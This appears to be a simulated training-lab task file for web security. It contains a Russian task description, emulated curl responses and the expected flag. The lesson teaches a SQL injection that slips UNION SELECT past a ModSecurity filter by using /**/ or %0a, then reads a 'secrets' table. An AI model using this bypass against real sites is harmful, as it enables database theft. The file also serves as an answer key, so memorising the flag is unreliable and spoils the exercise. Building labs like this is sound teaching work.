@@ -1,0 +1,39 @@
+{
+  "id": "web-waf-bypass",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{w4f_byp4ss_by_c0mm3nts}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: обход WAF\n\nЦель — `http://shop.local/search?q=`. За WAF: классический payload блокируется\n(403 от ModSecurity), потому что фильтр ищет словоразделитель между UNION и\nSELECT. Обойди фильтр и достань флаг из таблицы `secrets`.\n\n1. Обычный поиск:\n   curl -s 'http://shop.local/search?q=laptop'\n2. Классический payload — увидишь 403 от WAF:\n   curl -s -i 'http://shop.local/search?q=1+UNION+SELECT+flag+FROM+secrets'\n3. Обойди фильтр: вставь вместо пробела комментарий `/**/` (или перевод строки\n   `%0a`):\n   curl -s 'http://shop.local/search?q=1+UNION/**/+SELECT+flag+FROM+secrets'\n4. Флаг — последняя строка ответа. Запиши его в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/search)",
+      "cases": [
+        {
+          "match": "/\\*\\*|%0a",
+          "example": "-s 'http://shop.local/search?q=1+UNION/**/+SELECT+flag+FROM+secrets'",
+          "output": "<h2>Результаты поиска</h2>\n<table><tr><td>Laptop</td><td>1200</td></tr></table>\n<!-- строки из таблицы secrets -->\nnto{w4f_byp4ss_by_c0mm3nts}\n"
+        },
+        {
+          "match": "union.*select",
+          "example": "-s -i 'http://shop.local/search?q=1+UNION+SELECT+flag+FROM+secrets'",
+          "output": "HTTP/1.1 403 Forbidden\nServer: nginx\nContent-Type: text/html\n\n<h1>403 Forbidden</h1>\n<p>Request blocked by ModSecurity (rule 942100: SQL Injection Attack Detected)</p>\n"
+        },
+        {
+          "match": "search\\?q=",
+          "example": "-s 'http://shop.local/search?q=laptop'",
+          "output": "<h2>Результаты поиска</h2>\n<table><tr><td>Laptop</td><td>1200</td></tr><tr><td>Mouse</td><td>25</td></tr></table>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://shop.local/search?q= на shop.local.\n"
+    }
+  }
+}
